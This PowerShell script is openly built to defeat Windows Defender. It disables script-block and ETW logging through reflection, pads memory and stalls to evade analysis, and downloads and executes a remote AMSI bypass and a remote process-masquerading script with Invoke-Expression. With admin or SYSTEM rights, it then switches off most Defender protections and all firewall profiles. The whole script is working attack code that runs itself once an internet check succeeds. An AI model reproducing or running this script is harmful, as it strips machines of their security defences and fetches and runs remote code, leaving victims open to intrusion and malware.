function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
    [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
    [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
    $increment = 0
    $maxincrement = 40000000
    For ($increment=0; $increment -lt $maxincrement) { $increment++ }
    $fillmybuffer = "a" * 300MB
    $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
    Invoke-Expression $accessAMBY.Content
    Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
    MPEB -BinPath "C:\Windows\explorer.exe" | Out-Null
    MPEB -BinPath "C:\Windows\explorer.exe" | Out-Null
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($username -eq "NT AUTHORITY\SYSTEM") { 
        Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
        Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
        Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
        Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
        Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
        Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
        Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
        Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
        Start-Sleep 5
    }elseif ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
        Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
        Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
        Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
        Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
        Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
        Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
        Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
        Start-Sleep 5
    }elseif ( -not ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))) {
        Start-Sleep 5
    }
    Write-Host "WinDefender Bypassed! Go Ahead!"
}
$internetconnection = Test-Connection -ComputerName google.com -Quiet
if ($internetconnection) {
    Invoke-OneDoesNotSimplyBypassEntireWinDefender
}else {
    throw "This shit doesnt have internet connection,We cant continue!"
}
